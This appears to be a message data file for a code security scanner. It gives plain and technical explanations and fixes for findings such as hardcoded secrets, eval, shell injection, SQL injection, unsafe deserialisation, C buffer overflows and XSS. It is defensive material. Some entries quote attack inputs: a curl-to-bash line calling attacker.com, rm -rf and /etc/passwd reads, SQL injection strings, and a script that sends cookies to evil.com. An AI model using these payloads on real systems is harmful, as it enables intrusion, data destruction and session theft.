1.description: A password or secret key is written directly in the code. Anyone who reads the code can see it.
1.why_it_matters: Attackers search GitHub for leaked secrets 24/7. Even after deletion, git history preserves the secret forever unless you rotate it.
1.fix: Move the secret to an environment variable and read it at runtime.

2.description: Hardcoded credentials in source — visible in version control history even after removal.
2.why_it_matters: Automated secret-scanning bots find leaked API keys within minutes of a push. The credential must be rotated even after the commit is reverted.
2.fix: Environment variables or a secrets manager; never commit credentials.

3.description: Credential as string literal — exposed in source and VCS history.
3.why_it_matters: GitHub secret scanning, truffleHog, and similar tools find these automatically. Rotate immediately if pushed.
3.fix: Externalise to env var / secrets store; add git-secrets pre-commit hook.

4.why_it_matters: Automated scanning; immediate rotation required if exposed.

1.description: A note in the code says something security-related hasn't been finished yet.
1.why_it_matters: Shipping with an incomplete security fix is the same as shipping with a known hole — attackers look specifically for these acknowledged gaps.
1.fix: Complete the security work before shipping.

2.description: TODO/FIXME/HACK near security-sensitive code.
2.why_it_matters: Known, unresolved security issues are pentesters' and attackers' first targets.
2.fix: Resolve or track in issue system; do not ship with known gaps.

1.description: A file path specific to one computer is written into the code.
1.why_it_matters: The path reveals your internal directory structure, helping attackers plan a targeted attack.
1.fix: Use a configuration file or environment variable for paths.

4.description: Platform-specific hardcoded path — non-portable and information-leaking.
4.why_it_matters: Exposes directory structure to anyone who reads or decompiles the binary.
4.fix: Config/env var; relative paths or path-joining APIs.

1.description: eval() runs whatever text you give it as Python code. If an attacker controls that text, they can run any command on your computer.
1.why_it_matters: An attacker could type Python code into a form field and have it execute on your server — deleting files, stealing data, or opening a backdoor.
1.fix: Never pass user input to eval(). Use ast.literal_eval() for safe data parsing.

2.description: eval() executes arbitrary Python. User-controlled input reaching it is remote code execution.
2.why_it_matters: RCE is the most critical vulnerability class — attacker gains full server control with your process's privileges.
2.fix: ast.literal_eval() for data; redesign to avoid dynamic evaluation.

3.description: eval() with potentially untrusted input — RCE risk (CWE-95).
3.why_it_matters: RCE — attacker executes OS commands with the process's privileges.
3.fix: ast.literal_eval(); sandbox if eval is required.

1.description: exec() runs code from a string. An attacker who controls the input can take over your program.
1.why_it_matters: Same impact as eval() — full server takeover if user input reaches exec().
1.fix: Avoid exec() with any user-supplied data. Use explicit function calls instead.

2.description: exec() executes arbitrary Python — RCE if input is not fully trusted.
2.why_it_matters: RCE — attacker's code runs with your server's permissions.
2.fix: Avoid exec(); use explicit logic.

4.why_it_matters: Full code execution as server process.

1.description: shell=True passes the command through your computer's shell. Special characters like ; & | can run extra commands.
1.why_it_matters: An attacker could type ; rm -rf / or ; curl attacker.com/shell.sh | bash into any field that feeds into this command.
1.fix: Use shell=False (default) and pass the command as a list: subprocess.run(['cmd', 'arg1']).

2.description: subprocess with shell=True — shell injection if any argument is user-controlled (CWE-78).
2.why_it_matters: Shell injection gives the attacker a shell on your server with your process's permissions.
2.fix: shell=False + list args; shlex.quote() if shell is required.

1.description: pickle can run code hidden inside data. Loading pickled data from an untrusted source lets an attacker run anything.
1.why_it_matters: An attacker can craft a pickle file that executes any Python command the moment you load it. There is no safe mode for untrusted pickle data.
1.fix: Only unpickle data you created yourself. Use JSON for untrusted data.

2.description: pickle.loads() on untrusted data — arbitrary code execution. The pickle format is fundamentally unsafe.
2.why_it_matters: Pickle deserialisation is an RCE primitive with no mitigation possible when the source is untrusted.
2.fix: json.loads() or MessagePack for untrusted input.

1.description: os.system() runs a shell command as a string. If any part comes from a user, an attacker can inject extra commands.
1.why_it_matters: An attacker can append ; whoami or ; cat /etc/passwd to any user-controlled part of the command.
1.fix: Use subprocess.run(['cmd', 'arg']) with a list instead.

2.description: os.system() passes command to shell — injection risk if any argument is user-controlled (CWE-78).
2.why_it_matters: Command injection gives the attacker a shell on your server.
2.fix: subprocess.run() with list args and shell=False.

4.why_it_matters: OS command execution as server process.

1.description: This line lets someone put dangerous commands in your database query. An attacker could steal all your data or delete everything.
1.why_it_matters: An attacker could type ' OR '1'='1 into your login form and log in without a password. Or ' DROP TABLE users; -- to delete your entire user database.
1.fix: Use parameterized queries: cursor.execute('SELECT ... WHERE id = ?', (user_id,)) — never build SQL by joining strings.

2.description: Unsanitized user input in SQL via string concatenation. Use parameterized queries.
2.why_it_matters: SQL injection allows authentication bypass, full data dump, and in some databases arbitrary OS command execution. OWASP #1.
2.fix: Parameterized queries (? placeholders) or an ORM.

3.why_it_matters: SQLi enables auth bypass, data exfiltration, and in MSSQL/MySQL xp_cmdshell gives OS execution.
3.fix: Parameterise all user values; use an ORM.

4.why_it_matters: Auth bypass, data dump, potential OS exec.

1.description: yaml.load() without a Loader can execute Python code hidden in a YAML file.
1.why_it_matters: A malicious YAML config file can execute shell commands the moment it is loaded — no user interaction needed.
1.fix: Use yaml.safe_load() instead of yaml.load().

2.description: yaml.load() without a safe Loader — arbitrary Python objects can be deserialised, enabling RCE.
2.why_it_matters: Unsafe YAML is a known RCE vector (multiple CVEs). safe_load() is a one-line fix.
2.fix: yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader).

1.description: assert statements are completely removed when Python runs in optimized mode. Any security check using assert vanishes in production.
1.why_it_matters: If your server runs Python with -O (common in some deployment configs), every assert-based permission check is silently skipped — any user can access anything.
1.fix: Replace assert with: if not condition: raise PermissionError('Access denied')

2.description: assert stripped in optimized builds — auth bypass possible (CWE-617).
2.why_it_matters: Production Python is often run with optimisations; all assert guards become no-ops.
2.fix: Explicit if/raise for all security checks.

4.description: assert for auth check — disabled under -O (CWE-617).
4.why_it_matters: Complete auth bypass in optimised builds.

1.description: verify=False turns off the check that confirms you are talking to the real server. An attacker can impersonate the server.
1.why_it_matters: Anyone on the same network (cafe Wi-Fi, corporate proxy, ISP) can silently intercept all your HTTPS traffic — passwords, tokens, private data — when verify=False is used.
1.fix: Remove verify=False. If the cert is self-signed, supply verify='/path/to/ca.crt'.

2.description: SSL verification disabled — MITM attacks trivially possible (CWE-295).
2.why_it_matters: Any attacker who can route traffic intercepts plaintext HTTPS, bypassing TLS entirely.
2.fix: Fix the certificate or supply verify='/path/to/ca.pem'.

4.why_it_matters: TLS bypassed — traffic readable in plaintext.
4.fix: Fix cert or supply CA bundle.

1.description: strcpy() copies text without checking if it fits. Too much text overflows into other memory.
1.why_it_matters: Buffer overflows let attackers overwrite the return address on the stack and redirect execution to their own code. This is how many real-world exploits start.
1.fix: Use strncpy(dest, src, sizeof(dest) - 1) and manually null-terminate.

2.description: strcpy() — no bounds checking, classic buffer overflow (CWE-120).
2.why_it_matters: Stack smashing via strcpy is a textbook exploit technique. Overwriting the return address gives the attacker code execution.
2.fix: strncpy() + null termination, or snprintf(dest, size, "%s", src).

1.description: strcat() adds text to a buffer without checking if there is enough room.
1.why_it_matters: Same risk as strcpy — overflow the buffer, corrupt the stack, run attacker code.
1.fix: strncat(dest, src, remaining_space) or snprintf().

2.description: strcat() — buffer overflow risk (CWE-120).
2.why_it_matters: Stack/heap overflow -> arbitrary code execution.
2.fix: strncat with size limit or snprintf().

1.description: gets() reads input with no limit at all — it will overflow any buffer. It was removed from the C standard because it is so dangerous.
1.why_it_matters: This is the easiest buffer overflow to exploit. Any input longer than the buffer overwrites the stack. It gives an attacker full code execution instantly.
1.fix: Replace with fgets(buf, sizeof(buf), stdin).

2.description: gets() — unbounded, guaranteed overflow for long input. Removed in C11.
2.why_it_matters: Trivially exploitable stack smash — classic CTF/real-world RCE target.
2.fix: fgets(buf, sizeof(buf), stdin).

1.description: sprintf() formats text into a buffer without checking if it fits.
1.why_it_matters: A large value formatted into the buffer can overflow and overwrite adjacent memory, similar to strcpy().
1.fix: snprintf(buf, sizeof(buf), format, ...).

2.description: sprintf() — overflow if formatted output exceeds buffer (CWE-120).
2.why_it_matters: Buffer overflow via formatted output; exploitable if input size is attacker-influenced.
2.fix: snprintf(buf, sizeof(buf), fmt, ...).

1.description: printf() is being called with a variable as the format string. Special % codes in it can read memory or crash the program.
1.why_it_matters: An attacker who can inject %x into the string reads passwords and keys from the stack. With %n they can write to arbitrary addresses.
1.fix: Always use a format string: printf("%s", user_string) — never printf(user_string).

2.description: printf(user_input) — format string attack enables memory read/write (CWE-134).
2.why_it_matters: Format string bugs read stack memory and write to arbitrary addresses — enabling full RCE.
2.fix: printf("%s", var).

1.description: malloc(n * sizeof(...)) can overflow if n is very large, wrapping to a tiny number. The buffer will be far too small.
1.why_it_matters: An attacker who controls n can cause malloc to allocate 16 bytes when your code thinks it has 4 GB, creating a heap overflow.
1.fix: Use calloc(n, sizeof(type)) which handles the overflow check for you.

2.description: malloc(n * sizeof) — integer overflow -> undersized allocation if n is attacker-controlled (CWE-190).
2.why_it_matters: Integer overflow in allocation size is a classic heap overflow precursor.
2.fix: calloc(n, sizeof(T)) or validate n <= SIZE_MAX/sizeof(T).

1.description: malloc() can return NULL if the computer runs out of memory. Using a NULL pointer crashes the program.
1.why_it_matters: An attacker can exhaust server memory to trigger this NULL, then cause a crash. In privileged code a null dereference can enable privilege escalation.
1.fix: if (ptr == NULL) { /* handle error */ } right after malloc().

2.description: Unchecked malloc() return — dereferencing NULL causes crash (CWE-476).
2.why_it_matters: DoS via crash; null-page exploits in some kernel/privileged contexts.
2.fix: if (!ptr) { perror("malloc"); exit(EXIT_FAILURE); }

1.description: eval() runs text as JavaScript. An attacker who controls the text can steal cookies or take over the page.
1.why_it_matters: An attacker injects document.cookie into the eval'd string and sends your session token to their server — instant account takeover.
1.fix: Never use eval() with user data. Use JSON.parse() for data.

2.description: eval() executes arbitrary JS — XSS/code injection if user input reaches it.
2.why_it_matters: eval-based XSS bypasses many content filters. Attacker steals sessions, redirects users, or runs crypto miners.
2.fix: JSON.parse() for data; avoid eval() entirely.

1.description: Putting user text into innerHTML can run hidden scripts. An attacker can steal session cookies.
1.why_it_matters: An attacker posts a comment with <script>fetch('evil.com?c='+document.cookie)</script> and steals every visitor's login session.
1.fix: Use textContent instead of innerHTML for user-provided text.

2.description: innerHTML with user-controlled value — stored or reflected XSS (CWE-79).
2.why_it_matters: XSS enables session hijacking, credential harvesting, and drive-by malware delivery.
2.fix: textContent for text; DOMPurify.sanitize() if HTML is required.

1.description: document.write() inserts raw HTML. If any user text goes in, attackers can inject scripts.
1.why_it_matters: Injected script tag runs instantly in your page's origin, accessing all cookies and storage.
1.fix: Use DOM methods (createElement, appendChild) instead.

2.description: document.write() with user-controlled content — XSS (CWE-79).
2.why_it_matters: Script injection in page origin context — full access to cookies and local storage.
2.fix: DOM manipulation APIs.

1.description: Setting window.location from a variable can redirect users to a malicious site.
1.why_it_matters: Attackers send phishing links like yoursite.com/redirect?to=evil.com/login. Victims trust your domain and don't notice they've landed on a fake login page.
1.fix: Validate the redirect target against a list of allowed URLs.

2.description: window.location from variable — open redirect (CWE-601).
2.why_it_matters: Your trusted domain becomes a phishing launderer — attackers craft links that start at your site.
2.fix: Whitelist allowed redirect targets.
